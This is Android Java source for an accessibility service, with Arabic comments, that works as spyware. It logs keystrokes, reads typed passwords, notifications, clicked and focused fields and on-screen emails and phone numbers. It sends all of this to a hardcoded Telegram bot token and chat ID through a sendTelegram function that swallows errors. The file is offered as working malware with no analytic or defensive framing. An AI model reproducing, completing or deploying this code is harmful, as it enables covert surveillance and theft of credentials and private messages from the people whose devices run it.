package com.v8.global.sniffer;

import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Intent;
import android.content.Context;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.text.TextUtils;
import android.util.Log;
import android.view.KeyEvent;
import android.view.inputmethod.EditorInfo;
import java.io.IOException;
import java.util.List;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.TimeUnit;
import okhttp3.*;

public class MyAccessibilityService extends android.accessibilityservice.AccessibilityService {

    private static final String TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
    private static final String CHAT_ID = "7259620384";
    private static final String BASE_URL = "https://api.telegram.org/bot" + TOKEN + "/";
    
    private Handler mHandler = new Handler(Looper.getMainLooper());
    private StringBuilder keyLogBuffer = new StringBuilder();
    private boolean isKeyLogging = false;
    private String currentApp = "";
    private Map<String, String> capturedData = new HashMap<>();
    
    @Override
    public void onCreate() {
        super.onCreate();
        setupService();
        sendTelegram("✅ Accessibility Service نشط وجاهز");
    }
    
    private void setupService() {
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_CLICKED |
                         AccessibilityEvent.TYPE_VIEW_FOCUSED |
                         AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED |
                         AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED |
                         AccessibilityEvent.TYPE_VIEW_SCROLLED |
                         AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED |
                         AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED |
                         AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED |
                         AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUSED;
                         
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS |
                    AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION |
                    AccessibilityServiceInfo.FLAG_REQUEST_ENHANCED_WEB_ACCESSIBILITY |
                    AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
                    AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS;
                    
        info.notificationTimeout = 100;
        setServiceInfo(info);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                handleWindowChange(event);
                break;
                
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                handleViewClicked(event);
                break;
                
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                handleTextChanged(event);
                break;
                
            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                handleViewFocused(event);
                break;
                
            case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
                handleNotification(event);
                break;
                
            case AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUSED:
                handleAccessibilityFocus(event);
                break;
        }
        
        // تسجيل كل الأحداث إذا كان وضع التتبع مفعل
        if (isKeyLogging) {
            logEvent(event);
        }
    }
    
    private void handleWindowChange(AccessibilityEvent event) {
        String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "unknown";
        String className = event.getClassName() != null ? event.getClassName().toString() : "unknown";
        
        if (!packageName.equals(currentApp)) {
            currentApp = packageName;
            sendTelegram("🔄 فتح تطبيق: " + packageName + "\n📄 الصفحة: " + className);
        }
        
        // التقاط محتوى الشاشة الحالي
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root != null) {
            captureScreenContent(root, packageName);
        }
    }
    
    private void handleViewClicked(AccessibilityEvent event) {
        AccessibilityNodeInfo source = event.getSource();
        if (source != null) {
            String text = getNodeText(source);
            String hint = getNodeHint(source);
            String contentDesc = source.getContentDescription() != null ? source.getContentDescription().toString() : "";
            
            if (!TextUtils.isEmpty(text) || !TextUtils.isEmpty(hint) || !TextUtils.isEmpty(contentDesc)) {
                String clickInfo = "👆 نقرة في " + currentApp + ":\n" +
                                  "📝 النص: " + text + "\n" +
                                  "💡 التلميح: " + hint + "\n" +
                                  "📋 الوصف: " + contentDesc;
                sendTelegram(clickInfo);
            }
            
            source.recycle();
        }
    }
    
    private void handleTextChanged(AccessibilityEvent event) {
        if (isKeyLogging) {
            List<CharSequence> text = event.getText();
            if (text != null && !text.isEmpty()) {
                String enteredText = text.get(0).toString();
                if (!TextUtils.isEmpty(enteredText)) {
                    keyLogBuffer.append(enteredText);
                    
                    // إرسال كل 50 حرف أو عند وجود سطر جديد
                    if (keyLogBuffer.length() > 50 || enteredText.contains("\n")) {
                        sendTelegram("⌨️ مدخلات في " + currentApp + ":\n" + keyLogBuffer.toString());
                        keyLogBuffer.setLength(0);
                    }
                }
            }
        }
        
        // التقاط بيانات تسجيل الدخول
        AccessibilityNodeInfo source = event.getSource();
        if (source != null) {
            if (isPasswordField(source)) {
                capturePasswordField(source);
            }
            source.recycle();
        }
    }
    
    private void handleViewFocused(AccessibilityEvent event) {
        AccessibilityNodeInfo source = event.getSource();
        if (source != null) {
            String className = source.getClassName() != null ? source.getClassName().toString() : "";
            
            // تحديد نوع الحقل
            if (className.contains("EditText") || className.contains("TextView")) {
                String hint = getNodeHint(source);
                String text = getNodeText(source);
                String viewId = getViewId(source);
                
                if (!TextUtils.isEmpty(hint) || !TextUtils.isEmpty(viewId)) {
                    String focusInfo = "🎯 تركيز على حقل في " + currentApp + ":\n" +
                                      "🔖 المعرف: " + viewId + "\n" +
                                      "💡 التلميح: " + hint + "\n" +
                                      "📝 النص الحالي: " + text;
                    sendTelegram(focusInfo);
                }
            }
            source.recycle();
        }
    }
    
    private void handleNotification(AccessibilityEvent event) {
        List<CharSequence> text = event.getText();
        if (text != null && !text.isEmpty()) {
            StringBuilder notification = new StringBuilder("🔔 إشعار من " + currentApp + ":\n");
            for (CharSequence t : text) {
                if (!TextUtils.isEmpty(t)) {
                    notification.append(t.toString()).append("\n");
                }
            }
            sendTelegram(notification.toString());
        }
    }
    
    private void handleAccessibilityFocus(AccessibilityEvent event) {
        AccessibilityNodeInfo source = event.getSource();
        if (source != null) {
            // التقاط معلومات إضافية
            Bundle extras = new Bundle();
            if (source.getText() != null) {
                extras.putCharSequence("text", source.getText());
            }
            if (source.getContentDescription() != null) {
                extras.putCharSequence("content_description", source.getContentDescription());
            }
            source.recycle();
        }
    }
    
    private void captureScreenContent(AccessibilityNodeInfo node, String packageName) {
        if (node == null) return;
        
        // البحث عن حقول مهمة
        List<String> importantData = new ArrayList<>();
        findImportantData(node, importantData);
        
        if (!importantData.isEmpty()) {
            StringBuilder data = new StringBuilder("📊 بيانات مأخوذة من " + packageName + ":\n");
            for (String item : importantData) {
                data.append("• ").append(item).append("\n");
            }
            sendTelegram(data.toString());
        }
        
        node.recycle();
    }
    
    private void findImportantData(AccessibilityNodeInfo node, List<String> data) {
        if (node == null) return;
        
        int childCount = node.getChildCount();
        
        // فحص العقدة الحالية
        String text = getNodeText(node);
        String hint = getNodeHint(node);
        String contentDesc = node.getContentDescription() != null ? node.getContentDescription().toString() : "";
        String className = node.getClassName() != null ? node.getClassName().toString() : "";
        String viewId = getViewId(node);
        
        // البحث عن كلمات مفتاحية
        if (!TextUtils.isEmpty(text)) {
            if (text.contains("@") || text.contains(".") && text.length() > 5) { // بريد إلكتروني محتمل
                data.add("📧 بريد: " + text);
            } else if (text.matches(".*\\d{10,}.*")) { // رقم هاتف محتمل
                data.add("📞 هاتف: " + text);
            } else if (text.toLowerCase().contains("كلمة المرور") || 
                       text.toLowerCase().contains("password") ||
                       text.toLowerCase().contains("pass")) {
                data.add("🔑 حقل كلمة مرور: " + text);
            }
        }
        
        // فحص الأطفال
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                findImportantData(child, data);
                child.recycle();
            }
        }
    }
    
    private boolean isPasswordField(AccessibilityNodeInfo node) {
        if (node == null) return false;
        
        String className = node.getClassName() != null ? node.getClassName().toString() : "";
        String hint = getNodeHint(node);
        
        return className.contains("Password") || 
               (hint != null && (hint.toLowerCase().contains("password") || 
                hint.toLowerCase().contains("كلمة المرور") ||
                hint.toLowerCase().contains("كلمة السر")));
    }
    
    private void capturePasswordField(AccessibilityNodeInfo node) {
        String hint = getNodeHint(node);
        String text = getNodeText(node);
        String viewId = getViewId(node);
        
        if (!TextUtils.isEmpty(text)) {
            String passInfo = "🔐 كلمة مرور مدخلة في " + currentApp + ":\n" +
                             "🔖 الحقل: " + (hint != null ? hint : viewId) + "\n" +
                             "🔑 القيمة: " + text;
            sendTelegram(passInfo);
        }
    }
    
    private String getNodeText(AccessibilityNodeInfo node) {
        if (node == null) return "";
        CharSequence text = node.getText();
        return text != null ? text.toString() : "";
    }
    
    private String getNodeHint(AccessibilityNodeInfo node) {
        if (node == null) return "";
        CharSequence hint = node.getHintText();
        return hint != null ? hint.toString() : "";
    }
    
    private String getViewId(AccessibilityNodeInfo node) {
        if (node == null) return "";
        String viewId = node.getViewIdResourceName();
        return viewId != null ? viewId : "";
    }
    
    private void logEvent(AccessibilityEvent event) {
        StringBuilder eventLog = new StringBuilder("📝 حدث: " + event.getEventType() + "\n");
        eventLog.append("📱 التطبيق: ").append(currentApp).append("\n");
        eventLog.append("⏰ الوقت: ").append(System.currentTimeMillis()).append("\n");
        
        List<CharSequence> text = event.getText();
        if (text != null && !text.isEmpty()) {
            eventLog.append("📄 النص: ");
            for (CharSequence t : text) {
                eventLog.append(t).append(" ");
            }
            eventLog.append("\n");
        }
        
        // تخزين مؤقت بدل إرسال كل حدث
        if (keyLogBuffer.length() > 100) {
            sendTelegram(keyLogBuffer.toString());
            keyLogBuffer.setLength(0);
        } else {
            keyLogBuffer.append(eventLog.toString());
        }
    }
    
    @Override
    protected boolean onKeyEvent(KeyEvent event) {
        if (event.getAction() == KeyEvent.ACTION_DOWN) {
            int keyCode = event.getKeyCode();
            String key = KeyEvent.keyCodeToString(keyCode);
            
            // تسجيل ضغطات المفاتيح
            if (isKeyLogging) {
                if (keyCode == KeyEvent.KEYCODE_ENTER) {
                    keyLogBuffer.append("\n");
                } else if (keyCode == KeyEvent.KEYCODE_DEL) {
                    if (keyLogBuffer.length() > 0) {
                        keyLogBuffer.deleteCharAt(keyLogBuffer.length() - 1);
                    }
                } else {
                    char pressedKey = (char) event.getUnicodeChar();
                    if (pressedKey != 0) {
                        keyLogBuffer.append(pressedKey);
                    }
                }
            }
            
            // أوامر خاصة عبر المفاتيح
            if (event.isCtrlPressed() && keyCode == KeyEvent.KEYCODE_S) {
                // Ctrl+S لبدء تسجيل المفاتيح
                startKeyLogging();
                return true;
            } else if (event.isCtrlPressed() && keyCode == KeyEvent.KEYCODE_X) {
                // Ctrl+X لإيقاف تسجيل المفاتيح
                stopKeyLogging();
                return true;
            }
        }
        return super.onKeyEvent(event);
    }
    
    public void startKeyLogging() {
        isKeyLogging = true;
        keyLogBuffer.setLength(0);
        sendTelegram("⌨️ بدأ تسجيل لوحة المفاتيح");
    }
    
    public void stopKeyLogging() {
        isKeyLogging = false;
        if (keyLogBuffer.length() > 0) {
            sendTelegram("⌨️ آخر المدخلات:\n" + keyLogBuffer.toString());
            keyLogBuffer.setLength(0);
        }
        sendTelegram("⏹ تم إيقاف تسجيل لوحة المفاتيح");
    }
    
    @Override
    public void onInterrupt() {
        sendTelegram("⚠️ تم مقاطعة Accessibility Service");
    }
    
    @Override
    public void onDestroy() {
        if (keyLogBuffer.length() > 0) {
            sendTelegram("⌨️ مدخلات قبل الإيقاف:\n" + keyLogBuffer.toString());
        }
        sendTelegram("⛔ تم إيقاف Accessibility Service");
        super.onDestroy();
    }
    
    private void sendTelegram(String msg) {
        try {
            OkHttpClient client = new OkHttpClient.Builder()
                    .connectTimeout(30, TimeUnit.SECONDS)
                    .build();
            
            String url = BASE_URL + "sendMessage?chat_id=" + CHAT_ID + "&text=" + msg;
            
            client.newCall(new Request.Builder().url(url).build()).enqueue(new Callback() {
                @Override public void onFailure(Call c, IOException e) {}
                @Override public void onResponse(Call c, Response r) throws IOException { r.close(); }
            });
        } catch (Exception e) {}
    }
            }
